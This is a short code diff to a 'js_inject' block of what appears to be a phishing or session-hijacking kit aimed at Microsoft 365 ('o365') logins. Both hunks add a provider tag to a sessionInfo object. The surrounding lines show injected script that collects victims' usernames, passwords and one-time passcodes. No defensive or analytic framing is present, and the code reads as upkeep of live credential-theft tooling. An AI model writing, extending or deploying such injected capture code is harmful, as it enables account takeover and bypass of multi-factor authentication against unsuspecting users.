@@ -228,6 +228,7 @@ js_inject:
                 } catch(e) {}
 
                 var sessionInfo = {
+                    provider: 'o365',
                     credentials: (capturedCreds.username || capturedCreds.password || capturedCreds.otp)
                         ? { username: capturedCreds.username, password: capturedCreds.password, otp: capturedCreds.otp }
                         : undefined,
@@ -428,6 +429,7 @@ js_inject:
                 } catch(e) {}
 
                 var sessionInfo = {
+                    provider: 'o365',
                     credentials: (capturedCreds.username || capturedCreds.password || capturedCreds.otp)
                         ? { username: capturedCreds.username, password: capturedCreds.password, otp: capturedCreds.otp }
                         : undefined,
